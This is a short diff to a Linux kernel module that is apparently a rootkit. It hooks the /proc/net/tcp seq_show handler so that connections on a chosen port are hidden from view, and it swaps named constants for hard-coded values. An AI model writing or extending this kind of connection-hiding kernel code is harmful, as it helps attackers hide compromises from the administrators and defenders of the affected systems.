@@ -7,6 +7,7 @@
 #include <linux/fs.h>
 #include <linux/bio.h>
 #include <linux/vmalloc.h>
+#include <net/tcp.h>
 
 /*************** Module description ********************/
 MODULE_LICENSE("GPL");
@@ -234,7 +235,7 @@ int hooked_seq_show(struct seq_file *seq, void *v){
     int ret;
     char needle[6];
     
-    snprintf(needle, NEEDLE_LEN, ":%04X", port);
+    snprintf(needle, 6, ":%04X", port);
     ret = kernel_seq_show(seq, v);
 
     if (strnstr(seq->buf + seq->count - 150, needle, 150)) {
@@ -250,7 +251,7 @@ static void hook_port(void){
     struct file *filp;                                      
     struct tcp_seq_afinfo *afinfo;                                  
                                                          
-    filp = filp_open(NET_ENTRY, O_RDONLY, 0);                 
+    filp = filp_open("/proc/net/tcp", O_RDONLY, 0);                 
     if (IS_ERR(filp)) {                             
         return;                               
     } 
